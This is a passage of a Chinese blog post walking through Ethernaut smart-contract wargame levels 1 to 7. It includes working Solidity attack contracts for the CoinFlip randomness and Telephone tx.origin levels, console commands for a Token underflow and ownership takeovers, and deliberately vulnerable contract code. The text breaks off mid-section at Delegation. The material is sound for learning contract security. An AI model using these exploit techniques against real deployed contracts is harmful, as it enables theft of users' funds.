{"title":"Ethernaut题解","uid":"baf051e8c20586e4bdafd3f442f3dba1","slug":"Ethernaut题解","date":"2023-03-24T15:30:12.000Z","updated":"2023-03-24T15:31:17.301Z","comments":true,"path":"api/articles/Ethernaut题解.json","keywords":null,"cover":"https://s2.loli.net/2022/12/17/eOYWR2zZ9rqSchP.jpg","content":"<h1 id=\"Ethernaut\"><a href=\"#Ethernaut\" class=\"headerlink\" title=\"Ethernaut\"></a>Ethernaut</h1><h2 id=\"1-Hello\"><a href=\"#1-Hello\" class=\"headerlink\" title=\"1.Hello\"></a>1.Hello</h2><p>建立MetaMask账号连接一下<br>按F12打开浏览器的控制台，输入<code>help()</code></p>\n<p><img src=\"https://s2.loli.net/2022/12/07/Mu9PwLW6raEtUQq.png\" alt=\"image-20221207233231321.png\"></p>\n<p>使用命令<code>getBalance(player)</code>查询账户余额，显示<code>pending</code>，可以展开看（或者使用<code>await getBalance(player)</code>）</p>\n<p><img src=\"https://s2.loli.net/2022/12/07/jCZNaV5XyI7Ppul.png\" alt=\"image-20221207233558909.png\"></p>\n<p><strong>ethernaut合约</strong></p>\n<p>在控制台输入<code>ethernaut</code></p>\n<p><strong>和ABI互动</strong></p>\n<p><code>ethernaut</code> 是一个 <code>TruffleContract</code> 对象， 它包装了部署在区块链上的 <code>Ethernaut.sol</code> 合约.</p>\n<p>除此之外，合约的 ABI 还提供了所有的 <code>Ethernaut.sol</code> 公开方法, 比如 <code>owner</code>.</p>\n<p><code>ethernaut.owner()</code>或者<code>await ethernaut.owner()</code></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">await contract.info()<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>不断互动</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">await contract.info()\n\"You will find what you need in info1().\"\n\nawait contract.info1()\n\"Try info2(), but with \"hello\" as a parameter.\"\n\nawait contract.info2(\"hello\")\n\"The property infoNum holds the number of the next info method to call.\"\n\nawait contract.infoNum()\n42\n\nawait contract.info42()\n\"theMethodName is the name of the next method.\"\n\nawait contract.theMethodName()\n\"The method name is method7123949.\"\n\nawait contract.method7123949()\n\"If you know the password, submit it to authenticate().\"\n\nawait contract.password()\n\"ethernaut0\"\n\nawait contract.authenticate(\"ethernaut0\")<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h2 id=\"2-Fallback\"><a href=\"#2-Fallback\" class=\"headerlink\" title=\"2.Fallback\"></a>2.Fallback</h2><p>首先查询合约地址的余额和地址</p>\n<p><img src=\"https://s2.loli.net/2022/12/09/X84sGRCwgTDyu5F.png\" alt=\"image-20221209111329754.png\"></p>\n<p>调用<code>contribute()</code>函数转入1wei</p>\n<p><img src=\"https://s2.loli.net/2022/12/08/GV8bExcPUIol9wv.png\" alt=\"image-20221208171506372.png\"></p>\n<p>再次查询余额</p>\n<p><img src=\"https://s2.loli.net/2022/12/08/Y6tRT5bIAUs9QeS.png\" alt=\"image-20221208171604933.png\"></p>\n<p>要将合约的所有者变成自己，需要调用<code>receive()</code></p>\n<p><strong>调用合约不存在的函数就可以触发（或者说转账）</strong></p>\n<p>触发函数，地址发生改变</p>\n<p><img src=\"https://s2.loli.net/2022/12/09/4rBe2l9xvjJaAwF.png\" alt=\"image-20221209111248280.png\"></p>\n<p>将所有的钱取出提交即可</p>\n<p><img src=\"https://s2.loli.net/2022/12/09/ctpWViP52D6fkjb.png\" alt=\"image-20221209111510896.png\"></p>\n<h2 id=\"3-Fallout\"><a href=\"#3-Fallout\" class=\"headerlink\" title=\"3.Fallout\"></a>3.Fallout</h2><p>乍一看看不懂，其实拿到合约的权限很简单（可以放在Remix上测试一下）</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">function</span> <span class=\"token function\">Fal1out</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">{</span>\n    owner <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>\n    allocations<span class=\"token punctuation\">[</span>owner<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<p>只需要调用构造函数<code>Fallout()</code></p>\n<p><img src=\"https://s2.loli.net/2022/12/09/i7AI5muVcHPUNTC.png\" alt=\"image-20221209114007380.png\"></p>\n<h2 id=\"4-Coin-Flip\"><a href=\"#4-Coin-Flip\" class=\"headerlink\" title=\"4.Coin Flip\"></a>4.Coin Flip</h2><p>先贴上源代码和攻击合约</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.8.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">CoinFlip</span> <span class=\"token punctuation\">{</span>\n\n  <span class=\"token builtin\">uint256</span> <span class=\"token keyword\">public</span> consecutiveWins<span class=\"token punctuation\">;</span>\n  <span class=\"token builtin\">uint256</span> lastHash<span class=\"token punctuation\">;</span>\n  <span class=\"token builtin\">uint256</span> FACTOR <span class=\"token operator\">=</span> <span class=\"token number\">57896044618658097711785492504343953926634992332820282019728792003956564819968</span><span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    consecutiveWins <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">flip</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span> _guess<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token builtin\">uint256</span> blockValue <span class=\"token operator\">=</span> <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">(</span><span class=\"token function\">blockhash</span><span class=\"token punctuation\">(</span>block<span class=\"token punctuation\">.</span>number <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>lastHash <span class=\"token operator\">==</span> blockValue<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n      <span class=\"token keyword\">revert</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    lastHash <span class=\"token operator\">=</span> blockValue<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint256</span> coinFlip <span class=\"token operator\">=</span> blockValue <span class=\"token operator\">/</span> FACTOR<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">bool</span> side <span class=\"token operator\">=</span> coinFlip <span class=\"token operator\">==</span> <span class=\"token number\">1</span> <span class=\"token operator\">?</span> <span class=\"token boolean\">true</span> <span class=\"token punctuation\">:</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>side <span class=\"token operator\">==</span> _guess<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n      consecutiveWins<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n      consecutiveWins <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n  <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">exploit</span> <span class=\"token punctuation\">{</span>\n  CoinFlip expFlip<span class=\"token punctuation\">;</span>\n  <span class=\"token builtin\">uint256</span> FACTOR <span class=\"token operator\">=</span> <span class=\"token number\">57896044618658097711785492504343953926634992332820282019728792003956564819968</span><span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> aimAddr<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    expFlip <span class=\"token operator\">=</span> <span class=\"token function\">CoinFlip</span><span class=\"token punctuation\">(</span>aimAddr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">hack</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token builtin\">uint256</span> blockValue <span class=\"token operator\">=</span> <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">(</span><span class=\"token function\">blockhash</span><span class=\"token punctuation\">(</span>block<span class=\"token punctuation\">.</span>number<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint256</span> coinFlip <span class=\"token operator\">=</span> <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">(</span>blockValue<span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> FACTOR<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">bool</span> guess <span class=\"token operator\">=</span> coinFlip <span class=\"token operator\">==</span> <span class=\"token number\">1</span> <span class=\"token operator\">?</span> <span class=\"token boolean\">true</span> <span class=\"token punctuation\">:</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n    expFlip<span class=\"token punctuation\">.</span><span class=\"token function\">flip</span><span class=\"token punctuation\">(</span>guess<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>读合约，合约将抛硬币的正反抽象成产生新的区块的哈希值/<code>FACTOR</code>的值是否等于1（这个做除法的过程就是取整，其实就是判断产生新区块的哈希值与<code>FACTOR</code>的大小关系）</p>\n<p><img src=\"https://s2.loli.net/2022/12/12/7SgIqvl6LMeaUOw.png\" alt=\"image-20221212203141524.png\"></p>\n<p><code>FACTOR</code>=2^255</p>\n<p>分析一下源代码里面的<code>revert()</code></p>\n<p>判断<code>lastHash==blockValue</code>，如果没有这个判断，直接执行下面的语句<code>lastHash=blockValue</code>，会出现下一个区块还没产生，直接赋值，导致所有的区块的哈希值都一样的情况</p>\n<p>攻击合约的代码是产生区块后，根据算出来的结果进行猜测来操作的</p>\n<p>在remix上部署攻击合约，填入实例的地址，部署上链，进行<code>hack()</code>攻击</p>\n<p><img src=\"https://s2.loli.net/2022/12/12/fBiqZhRtyo1EIg4.png\" alt=\"image-20221212204408545.png\"></p>\n<h3 id=\"Tip：写攻击合约的两种方式\"><a href=\"#Tip：写攻击合约的两种方式\" class=\"headerlink\" title=\"Tip：写攻击合约的两种方式\"></a>Tip：写攻击合约的两种方式</h3><ul>\n<li><p>要将要攻击的合约的源码赋在上面，创建一个CoinFlip类，给他地址（就是上面那个源码）<img src=\"https://s2.loli.net/2022/12/13/LFdfG2OIAxSzg3U.png\" alt=\"image-20221213110659849.png\"></p>\n</li>\n<li><p>使用接口<code>interface</code>，加入抽象函数</p>\n</li>\n</ul>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.8.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">interface</span> <span class=\"token class-name\">CoinFlip</span><span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">function</span> <span class=\"token function\">flip</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span> _guess<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">exploit</span> <span class=\"token punctuation\">{</span>\n  CoinFlip expFlip<span class=\"token punctuation\">;</span>\n  <span class=\"token builtin\">uint256</span> FACTOR <span class=\"token operator\">=</span> <span class=\"token number\">57896044618658097711785492504343953926634992332820282019728792003956564819968</span><span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> aimAddr<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    expFlip <span class=\"token operator\">=</span> <span class=\"token function\">CoinFlip</span><span class=\"token punctuation\">(</span>aimAddr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">hack</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token builtin\">uint256</span> blockValue <span class=\"token operator\">=</span> <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">(</span><span class=\"token function\">blockhash</span><span class=\"token punctuation\">(</span>block<span class=\"token punctuation\">.</span>number<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint256</span> coinFlip <span class=\"token operator\">=</span> <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">(</span>blockValue<span class=\"token punctuation\">)</span> <span class=\"token operator\">/</span> FACTOR<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">bool</span> guess <span class=\"token operator\">=</span> coinFlip <span class=\"token operator\">==</span> <span class=\"token number\">1</span> <span class=\"token operator\">?</span> <span class=\"token boolean\">true</span> <span class=\"token punctuation\">:</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n    expFlip<span class=\"token punctuation\">.</span><span class=\"token function\">flip</span><span class=\"token punctuation\">(</span>guess<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h2 id=\"5-Telephone\"><a href=\"#5-Telephone\" class=\"headerlink\" title=\"5.Telephone\"></a>5.Telephone</h2><p>贴个源码</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.8.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Telephone</span> <span class=\"token punctuation\">{</span>\n\n  <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> owner<span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    owner <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">changeOwner</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _owner<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>tx<span class=\"token punctuation\">.</span>origin <span class=\"token operator\">!=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n      owner <span class=\"token operator\">=</span> _owner<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n  <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>首先是关于这个<code>tx.origin</code></p>\n<p><img src=\"https://s2.loli.net/2022/12/13/Y21kRUocwTpPBNu.png\" alt=\"image-20221213115847106.png\"></p>\n<p>分析源码要获得合约，需要调用<code>changeOwner()</code>函数，要满足条件<code>tx.origin!=msg.sender</code>，需要另外写一个合约来调用这个函数，这时<code>tx.origin</code>是受害者合约的<code>msg.sender</code>；而条件中的<code>msg.sender</code>是部署攻击合约的<code>msg.sender</code></p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.8.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Telephone</span> <span class=\"token punctuation\">{</span>\n\n  <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> owner<span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    owner <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">changeOwner</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _owner<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>tx<span class=\"token punctuation\">.</span>origin <span class=\"token operator\">!=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n      owner <span class=\"token operator\">=</span> _owner<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n  <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">call</span><span class=\"token punctuation\">{</span>\n    Telephone mytele<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> aim<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n        mytele<span class=\"token operator\">=</span><span class=\"token function\">Telephone</span><span class=\"token punctuation\">(</span>aim<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">attack</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span><span class=\"token punctuation\">{</span>\n        mytele<span class=\"token punctuation\">.</span><span class=\"token function\">changeOwner</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://s2.loli.net/2022/12/13/V3uneMrKSH62Zps.png\" alt=\"image-20221213115808010.png\"></p>\n<p><img src=\"https://s2.loli.net/2022/12/13/sb1LfUpo8md4vqr.png\" alt=\"image-20221213160348307.png\"></p>\n<h2 id=\"6-Token\"><a href=\"#6-Token\" class=\"headerlink\" title=\"6.Token\"></a>6.Token</h2><p>贴源码</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.6.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Token</span> <span class=\"token punctuation\">{</span>\n\n  <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=&gt;</span> <span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> balances<span class=\"token punctuation\">;</span>\n  <span class=\"token builtin\">uint</span> <span class=\"token keyword\">public</span> totalSupply<span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> _initialSupply<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n    balances<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> totalSupply <span class=\"token operator\">=</span> _initialSupply<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _to<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> _value<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>balances<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> _value <span class=\"token operator\">&gt;=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    balances<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> _value<span class=\"token punctuation\">;</span>\n    balances<span class=\"token punctuation\">[</span>_to<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> _value<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _owner<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> balance<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">return</span> balances<span class=\"token punctuation\">[</span>_owner<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>看一眼，感觉就是整数溢出的题目（刚开始跟着教程搞了半天没整出来，发现是教程有问题），可以构造<code>balances[msg.sender] - _value</code>发生下溢让其<code>&gt;=0</code>来实现</p>\n<p>查自己的余额：<code>await contract.balanceOf(player)</code></p>\n<p>转账发生下溢：<code>await contract.transfer('0xd212B8E81bB00838ceDeE960d778F316dC334eee',21)</code></p>\n<p>Tip：注意！！！要转给其他用户地址！！！其他用户地址要用单引号<code>'</code>括起来！！！</p>\n<p><img src=\"https://s2.loli.net/2022/12/13/8lIvXE3kHMeDhad.png\" alt=\"image-20221213164722442.png\"></p>\n<h2 id=\"7-Delegation（多想想）\"><a href=\"#7-Delegation（多想想）\" class=\"headerlink\" title=\"7.Delegation（多想想）\"></a>7.Delegation（多想想）</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.8.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Delegate</span> <span class=\"token punctuation\">{</span>\n\n  <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> owner<span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _owner<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    owner <span class=\"token operator\">=</span> _owner<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">pwn</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n    owner <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Delegation</span> <span class=\"token punctuation\">{</span>\n\n  <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> owner<span class=\"token punctuation\">;</span>\n  Delegate delegate<span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _delegateAddress<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    delegate <span class=\"token operator\">=</span> <span class=\"token function\">Delegate</span><span class=\"token punctuation\">(</span>_delegateAddress<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    owner <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n\n  <span class=\"token function\">fallback</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span> result<span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span>delegate<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">delegatecall</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n      <span class=\"token keyword\">this</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n  <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>在合约<code>Delegate</code>中，<code>pwn()</code>函数改变owner</p>\n<p>而合约<code>Delegation</code>的回退函数调用时，<code>delegatecall</code>将<code>msg.data</code>转发给<code>delegate</code>合约，然后将<code>delegatecall</code>的返回值存入<code>result</code>变量，再继续执行合约代码</p>\n<p>题解：</p>\n<pre 